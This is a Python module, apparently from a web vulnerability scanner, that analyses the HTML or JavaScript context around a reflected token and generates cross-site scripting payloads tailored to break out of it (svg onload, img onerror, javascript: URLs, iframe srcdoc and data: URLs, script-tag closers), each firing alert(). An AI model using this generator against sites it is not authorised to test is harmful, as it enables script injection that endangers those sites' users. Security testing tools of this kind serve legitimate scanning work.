"""SV1 - injection context analysis.

A reflection is not a vulnerability. What matters is the grammar around it:
inside a tag, a quoted attribute, a JS string, a comment, raw text, plain text.
Read the grammar, then build one payload that closes exactly what is open.

Raw-text elements (title, textarea, style, noscript, xmp) are their own
grammar: markup inside them is text, not HTML. They need a closing tag first.
The same is true for a reflection inside the opening <script> tag itself.

The scanner walks the document once instead of trusting rfind('<'): markup
inside a quoted attribute (an iframe data: URL, for example) is data, not a
new tag.
"""

from __future__ import annotations

import re
from dataclasses import dataclass

TAG_RE = re.compile(r"<\s*([a-zA-Z][a-zA-Z0-9:-]*)")
ATTR_RE = re.compile(r"([^\s=<>/]+)\s*=\s*[^=\s<>]*$")
URL_ATTRS = ("href", "src", "action", "formaction", "data", "poster", "cite")
RAW_TAGS = ("title", "textarea", "style", "xmp", "noscript")
SCAN_RAW = RAW_TAGS + ("script",)
REGEX_PREV = "=(:,[!&|?{};+-*%<>~^"


@dataclass(frozen=True)
class Site:
    kind: str               # text | attr | script | comment | raw | tagname
    tag: str = ""
    attr: str = ""
    quote: str = ""         # html quote that is currently open
    js_quote: str = ""      # js string that is currently open
    js_comment: str = ""    # line | block
    js_regex: bool = False

    def summary(self) -> str:
        if self.kind == "tagname":
            return "as the element tag name"
        if self.kind == "attr":
            quote = {"'": "single", '"': "double", "": "bare"}.get(self.quote, self.quote)
            if self.tag == "script":
                return f"inside the opening <script> tag, attribute {self.attr or '?'} ({quote} quoted)"
            return f"inside <{self.tag or '?'}> attribute {self.attr or '?'} ({quote} quoted)"
        if self.kind == "script":
            if self.js_comment:
                return f"inside a <script> block ({self.js_comment} comment)"
            if self.js_regex:
                return "inside a <script> block (regular expression)"
            quote = {"'": "single", '"': "double", "`": "template", "": "code"}.get(
                self.js_quote, self.js_quote
            )
            return f"inside a <script> block ({quote})"
        if self.kind == "comment":
            return "inside an HTML comment"
        if self.kind == "raw":
            return f"inside <{self.tag or '?'}> raw text"
        return "in HTML text flow"


def _scan(head: str) -> tuple:
    """Return the parser state at the end of head.

    States: data, comment, tag, raw. Quotes are respected everywhere, so a
    '<h1>' inside an attribute value does not look like a new element.
    """
    lower = head.lower()
    mode = "data"
    tag_name = ""
    tag_start = -1
    tag_end = -1
    name_end = -1
    quote = ""
    raw_tag = ""
    raw_start = 0
    index = 0
    while index < len(head):
        if mode == "comment":
            if head.startswith("-->", index):
                mode = "data"
                index += 3
                continue
            index += 1
            continue
        if mode == "raw":
            closing = f"</{raw_tag}"
            if lower.startswith(closing, index):
                mode = "data"
                raw_tag = ""
                index += len(closing)
                continue
            index += 1
            continue
        if mode == "tag":
            char = head[index]
            if quote:
                if char == quote:
                    quote = ""
            elif char in "\"'":
                quote = char
            elif char == ">":
                mode = "raw" if tag_name in SCAN_RAW else "data"
                raw_tag = tag_name if mode == "raw" else ""
                raw_start = index + 1
                tag_end = index
                quote = ""
            index += 1
            continue
        # data
        if head.startswith("<!--", index):
            mode = "comment"
            index += 4
            continue
        if head[index] == "<":
            match = TAG_RE.match(head, index)
            if match:
                tag_name = match.group(1).lower()
                tag_start = index
                tag_end = -1
                name_end = match.end()
                quote = ""
                mode = "tag"
                index = match.end()
                continue
        index += 1
    return mode, tag_name, tag_start, tag_end, name_end, quote, raw_tag, raw_start


def _js_state(src: str) -> tuple:
    """String quote, comment kind and regex-literal state at end of src."""
    quote = ""
    comment = ""
    regex = False
    previous = ""
    index = 0
    while index < len(src):
        char = src[index]
        if comment == "line":
            if char == "\n":
                comment = ""
        elif comment == "block":
            if src.startswith("*/", index):
                comment = ""
                index += 2
                continue
        elif quote:
            if char == "\\":
                index += 2
                continue
            if char == quote:
                quote = ""
        elif regex:
            if char == "\\":
                index += 2
                continue
            if char == "/":
                regex = False
        else:
            if src.startswith("//", index):
                comment = "line"
                index += 2
                continue
            if src.startswith("/*", index):
                comment = "block"
                index += 2
                continue
            if char in "\"'`":
                quote = char
            elif char == "/" and (not previous or previous in REGEX_PREV):
                regex = True
            if not char.isspace():
                previous = char
        index += 1
    return quote, comment, regex


def _attr_name(tag_src: str) -> str:
    match = ATTR_RE.search(tag_src)
    return match.group(1).lower() if match else ""


def analyze(text: str, index: int) -> Site:
    """Classify the exact spot where our token landed."""
    head = text[:index]
    mode, tag_name, tag_start, _tag_end, name_end, quote, raw_tag, raw_start = _scan(head)

    if mode == "comment":
        return Site("comment")

    if mode == "tag":
        if tag_start >= 0 and name_end >= 0 and index <= name_end:
            return Site("tagname", tag=tag_name)
        return Site(
            "attr",
            tag=tag_name,
            attr=_attr_name(head[tag_start:index]) if tag_start >= 0 else "",
            quote=quote,
        )

    if mode == "raw":
        if raw_tag == "script":
            js_quote, js_comment, js_regex = _js_state(head[raw_start:])
            return Site(
                "script",
                tag="script",
                js_quote=js_quote,
                js_comment=js_comment,
                js_regex=js_regex,
            )
        return Site("raw", tag=raw_tag)

    if head.endswith("<"):
        return Site("tagname")

    return Site("text")


def _alert(token: str, html_quote: str = "") -> str:
    """alert() with a string quote that does not collide with the HTML one."""
    if html_quote == "'":
        return f'alert("{token}")'
    return f"alert('{token}')"


def _event_quote(call: str) -> str:
    """Quote an event attribute with a character not used by the JS call."""
    return '"' if "'" in call else "'"


def payloads(site: Site, token: str) -> list[str]:
    """Ordered candidates, context first, no duplicates."""
    out: list[str] = []

    if site.kind == "script":
        call = _alert(token, "'" if site.js_quote == "'" else "")
        if site.js_comment == "line":
            out.append(f"{token}\n{call}//")
            out.append(f"{token}\n</script><svg/onload={call}>")
        elif site.js_comment == "block":
            out.append(f"{token}*/0;{call}/*")
            out.append(f"{token}*/{call}/*")
            out.append(f"{token}*/</script><svg/onload={call}>")
        elif site.js_regex:
            out.append(f"{token}/;{call};//")
            out.append(f"{token}/;{call};/*")
        elif site.js_quote:
            quote = site.js_quote
            out.append(f"0{quote};{call}//")
            out.append(f"0{quote});{call}//")
            out.append(f"0{quote}];{call}//")
            out.append(f"{token}</script><svg/onload={call}>")
        else:
            out.append(f"0;{call}//{token}")
            out.append(f"{token};{call}//")
            out.append(f"{token}</script><svg/onload={call}>")
            out.append(f"0;{call};{token}//")

    elif site.kind == "attr":
        quote = site.quote
        call = _alert(token, quote)
        event_quote = quote or _event_quote(call)
        if site.attr.startswith("on"):
            # The handler is already the execution context. A quote-free
            # payload survives servers that escape quotes inside the value.
            out.append(f"alert(/{token}/)")
        if site.tag == "script":
            if quote:
                out.append(f"{token}{quote}></script><svg/onload={call}>")
                out.append(f"{token}{quote}></script><img src=x onerror={call}>")
            else:
                out.append(f"{token}></script><svg/onload={call}>")
                out.append(f"{token}></script><img src=x onerror={call}>")
        elif site.attr == "srcdoc":
            out.append(f"<svg/onload={call}>")
            out.append(f"<img src=x onerror={call}>")
            out.append(f'{quote}><svg/onload={call}>')
        elif site.tag in RAW_TAGS:
            if quote:
                out.append(f"{token}{quote}></{site.tag}><svg/onload={call}>")
                out.append(f"{token}{quote}></{site.tag}><img src=x onerror={call}>")
            else:
                out.append(f"{token}></{site.tag}><svg/onload={call}>")
                out.append(f"{token}></{site.tag}><img src=x onerror={call}>")
        elif site.tag == "iframe":
            prefix = f"{token}{quote}" if quote else token
            out.append(f'{prefix} srcdoc="<script>alert(\'{token}\')</script>"')
            out.append(f'{prefix} src="data:text/html,<script>alert(\'{token}\')</script>"')
            out.append(f"{prefix}><svg/onload={call}>")
        else:
            if site.attr in URL_ATTRS:
                if site.tag in ("object", "iframe"):
                    out.append(f"data:text/html,<script>{call}</script>")
                out.append(f"javascript:{call}")
            if quote:
                out.append(f"{token}{quote}><svg/onload={call}>")
                out.append(f"{token}{quote}><script>{call}</script>")
                out.append(f"{token}{quote}></{site.tag}><script>{call}</script>")
                out.append(f"{token}{quote}><img src=x onerror={call}>")
                out.append(f"{token}{quote} autofocus onfocus={event_quote}{call}{event_quote}")
                out.append(f"{token}{quote} onmouseover={event_quote}{call}{event_quote}")
            else:
                out.append(f"{token} onmouseover={event_quote}{call}{event_quote} x=")
                out.append(f"{token} autofocus onfocus={event_quote}{call}{event_quote} x=")
                out.append(f"{token}><svg/onload={call}>")
                out.append(f"{token}><img src=x onerror={call}>")

    elif site.kind == "tagname":
        call = _alert(token)
        out.append(f"{token}><svg/onload={call}>")
        out.append(f"{token}><img src=x onerror={call}>")
        out.append(f"{token} onmouseover={_event_quote(call)}{call}{_event_quote(call)} x=")

    elif site.kind == "comment":
        call = _alert(token)
        out.append(f"{token}--><svg/onload={call}>")
        out.append(f"{token}--><img src=x onerror={call}>")

    elif site.kind == "raw":
        call = _alert(token)
        tag = site.tag if site.tag in RAW_TAGS else "textarea"
        out.append(f"</{tag}><svg/onload={call}>")
        out.append(f"</{tag}><img src=x onerror={call}>")
        out.append(f"</{tag}><script>{call}</script>")

    else:
        call = _alert(token)
        out.append(f"<svg/onload={call}>{token}")
        out.append(f"<img src=x onerror={call}>{token}")
        out.append(f"<script>{call}</script>{token}")

    return _unique(out)


def _unique(values: list[str]) -> list[str]:
    seen: set[str] = set()
    ordered: list[str] = []
    for value in values:
        if value in seen:
            continue
        seen.add(value)
        ordered.append(value)
    return ordered
